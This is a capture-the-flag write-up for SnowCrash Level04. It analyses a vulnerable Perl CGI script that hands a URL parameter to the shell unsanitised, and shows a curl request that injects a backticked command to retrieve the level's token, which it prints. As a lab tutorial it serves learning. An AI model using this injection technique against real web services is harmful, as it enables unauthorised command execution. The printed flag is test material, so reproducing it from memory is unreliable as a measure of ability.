Level04 - CGI Script Command Injection

Overview

This level involves exploiting a Perl CGI script running on a local web server. The script has a command injection vulnerability that allows us to execute arbitrary commands.
Solution Steps
Step 1: Analyze the Perl Script
Examine the level04.pl file:

```sh
level04@SnowCrash:~$ cat level04.pl
```

Script breakdown:

```perl
#!/usr/bin/perl                        # Perl interpreter
# localhost:4747                       # Web server runs on port 4747
use CGI qw{param};                     # CGI module for handling web requests
print "Content-type: text/html\n\n";   # HTTP response header

sub x {                                # Define function 'x'
  $y = $_[0];                          # Get first parameter
  print `echo $y 2>&1`;                # Execute echo with the parameter (VULNERABLE!)
}

x(param("x"));                         # Call function 'x' with GET/POST parameter
```

Step 2: Identify the Vulnerability
The problem:

```perl
print `echo $y 2>&1`;
```
The script uses backticks to execute shell commands. The variable $y is directly interpolated without any sanitization, creating a command injection vulnerability.
How it works:

The script accepts a parameter x from the URL
It passes this parameter to the shell via echo
We can inject additional commands using shell syntax

Step 3: Exploit the Vulnerability
Use command substitution syntax `command` to inject our own command:
```sh
level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

What happens:

1. The URL parameter is x=getflag``
2. The script executes: echo getflag 2>&1
3. The inner `getflag` is executed first by the shell
4. The result is then passed to echo and printed